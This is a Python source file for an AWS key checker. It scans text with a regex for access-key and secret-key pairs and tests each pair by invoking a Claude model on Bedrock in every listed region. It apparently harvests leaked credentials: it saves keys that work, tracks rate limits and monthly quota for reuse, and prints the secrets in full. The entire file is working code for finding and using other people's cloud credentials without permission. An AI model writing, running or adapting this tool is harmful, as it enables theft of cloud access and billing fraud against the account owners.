try:
    from .key_checker import KeyChecker
except ImportError:
    import os
    import sys

    sys.path.append(os.path.dirname(os.path.dirname(__file__)))
    from key_checkers.key_checker import KeyChecker

import json
from typing import Sequence

import boto3
from botocore.config import Config
from botocore.exceptions import BotoCoreError, ClientError


class AWSKeyChecker(KeyChecker):
    MODEL_ID = "anthropic.claude-3-haiku-20240307-v1:0"
    REQUEST_BODY = {
        "anthropic_version": "bedrock-2023-05-31",
        "max_tokens": 16,
        "messages": [
            {
                "role": "user",
                "content": [{"type": "text", "text": 'Just say "a"'}],
            }
        ],
    }
    BEDROCK_REGIONS = [
        "us-east-1",  # US East (N. Virginia)
        "us-east-2",  # US East (Ohio)
        "us-west-1",  # US West (N. California)
        "us-west-2",  # US West (Oregon)
        "us-gov-east-1",  # AWS GovCloud (US-East)
        "us-gov-west-1",  # AWS GovCloud (US-West)
        "ca-central-1",  # Canada (Central)
        "ca-west-1",  # Canada West (Calgary)
        "mx-central-1",  # Mexico (Central)
        "sa-east-1",  # South America (Sao Paulo)
        "eu-west-1",  # Europe (Ireland)
        "eu-west-2",  # Europe (London)
        "eu-west-3",  # Europe (Paris)
        "eu-central-1",  # Europe (Frankfurt)
        "eu-central-2",  # Europe (Zurich)
        "eu-north-1",  # Europe (Stockholm)
        "eu-south-1",  # Europe (Milan)
        "eu-south-2",  # Europe (Spain)
        "ap-east-2",  # Asia Pacific (Taipei)
        "ap-northeast-1",  # Asia Pacific (Tokyo)
        "ap-northeast-2",  # Asia Pacific (Seoul)
        "ap-northeast-3",  # Asia Pacific (Osaka)
        "ap-south-1",  # Asia Pacific (Mumbai)
        "ap-south-2",  # Asia Pacific (Hyderabad)
        "ap-southeast-1",  # Asia Pacific (Singapore)
        "ap-southeast-2",  # Asia Pacific (Sydney)
        "ap-southeast-3",  # Asia Pacific (Jakarta)
        "ap-southeast-4",  # Asia Pacific (Melbourne)
        "ap-southeast-5",  # Asia Pacific (Malaysia)
        "ap-southeast-7",  # Asia Pacific (Thailand)
        "il-central-1",  # Israel (Tel Aviv)
        "me-central-1",  # Middle East (UAE)
        "me-south-1",  # Middle East (Bahrain)
        "af-south-1",  # Africa (Cape Town)
    ]
    RATE_LIMIT_ERROR_CODES = {"ThrottlingException", "TooManyRequestsException", "ThrottledException"}
    QUOTA_ERROR_CODES = {"ServiceQuotaExceededException"}
    INVALID_ERROR_CODES = {
        "AccessDeniedException",
        "AuthFailure",
        "ExpiredTokenException",
        "IncompleteSignature",
        "InvalidClientTokenId",
        "InvalidSignatureException",
        "MissingAuthenticationToken",
        "OptInRequired",
        "SignatureDoesNotMatch",
        "UnauthorizedOperation",
        "UnrecognizedClientException",
    }

    def __init__(self):
        super().__init__()
        self._boto_config = Config(
            retries={"max_attempts": 1, "mode": "standard"},
            connect_timeout=5,
            read_timeout=10,
        )
        self._serialized_request = json.dumps(self.REQUEST_BODY).encode("utf-8")

    def get_regex_pattern(self) -> str:
        return r"((?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16})\b[\s\S]*?\b([A-Za-z0-9\x2F+=]{40})\b"

    def check_text(self, text: str):
        for match in super().extract_keys(text):
            try:
                serialized_key, _ = self._normalize_input(match)
            except ValueError:
                continue
            if serialized_key not in self.keys:
                self.verify_key(match)
        self.invalid_keys = []

    def verify_key(self, key: str | Sequence[str]):
        try:
            serialized_key, (access_key, secret_key) = self._normalize_input(key)
        except ValueError:
            return

        if serialized_key in self.invalid_keys:
            return

        last_error: Exception | None = None
        for region in self.BEDROCK_REGIONS:
            client = boto3.client(
                "bedrock-runtime",
                region_name=region,
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                config=self._boto_config,
            )
            try:
                response = client.invoke_model(
                    modelId=self.MODEL_ID,
                    body=self._serialized_request,
                    contentType="application/json",
                    accept="application/json",
                )
                body = response.get("body")
                if hasattr(body, "read"):
                    body.read()
                self.keys[serialized_key] = f"region:{region}"
                print("Verified AWS key", access_key, secret_key, "in region", region)
                self._save_keys()
                return True
            except ClientError as err:
                last_error = err
                code = self._client_error_code(err)
                message = self._client_error_message(err)
                if code == "ResourceNotFoundException" or "model" in message and "not found" in message:
                    continue
                if self._is_rate_limited(code, message):
                    print("Rate limit reached for AWS key", access_key, secret_key, "- retrying in 10 minutes")
                    self.keys[serialized_key] = "rate_limited"
                    self._schedule_retry(serialized_key)
                    self._save_keys()
                    return
                if self._is_quota_reached(code, message):
                    print("Monthly usage reached for AWS key", access_key, secret_key)
                    self.monthly_usage_reached_keys.add(serialized_key)
                    self._save_keys()
                    return
                if self._is_invalid(code, message):
                    break
            except (BotoCoreError, TimeoutError) as err:
                last_error = err
                continue
            except Exception as err:
                last_error = err
                continue

        self._handle_failure(serialized_key, access_key, secret_key, last_error)

    def _normalize_input(self, key: str | Sequence[str]):
        if isinstance(key, str):
            return key, self._deserialize(key)
        if isinstance(key, Sequence) and len(key) == 2:
            access_key = str(key[0]).strip()
            secret_key = str(key[1]).strip()
            return self._serialize(access_key, secret_key), (access_key, secret_key)
        raise ValueError("Invalid AWS credential format")

    def _serialize(self, access_key: str, secret_key: str) -> str:
        return f"{access_key}:{secret_key}"

    def _deserialize(self, serialized_key: str):
        if ":" not in serialized_key:
            raise ValueError("Serialized AWS credential is malformed")
        parts = serialized_key.split(":", 1)
        return parts[0], parts[1]

    def _client_error_code(self, error: ClientError) -> str:
        return str(error.response.get("Error", {}).get("Code", "")).strip()

    def _client_error_message(self, error: ClientError) -> str:
        message = error.response.get("Error", {}).get("Message") or ""
        return str(message).lower()

    def _is_rate_limited(self, code: str, message: str) -> bool:
        return code in self.RATE_LIMIT_ERROR_CODES or "throttle" in message

    def _is_quota_reached(self, code: str, message: str) -> bool:
        return code in self.QUOTA_ERROR_CODES or "quota" in message or "exceed" in message or "exhausted" in message

    def _is_invalid(self, code: str, message: str) -> bool:
        if code in self.INVALID_ERROR_CODES:
            return True
        return "not authorized" in message or "invalid" in message

    def _handle_failure(self, serialized_key: str, access_key: str, secret_key: str, last_error: Exception | None):
        if serialized_key not in self.keys:
            print("Not a valid AWS key", access_key, secret_key)
            self.invalid_keys.append(serialized_key)
            return
        if self.keys[serialized_key] == "dead":
            del self.keys[serialized_key]
            print("Deleted AWS key", access_key, secret_key, "because it is dead")
        else:
            self.keys[serialized_key] = "dead"
            print("Marked AWS key", access_key, secret_key, "as dead")
        self._save_keys()
        if last_error:
            print("Last AWS verification error for", access_key, secret_key, ":", last_error)
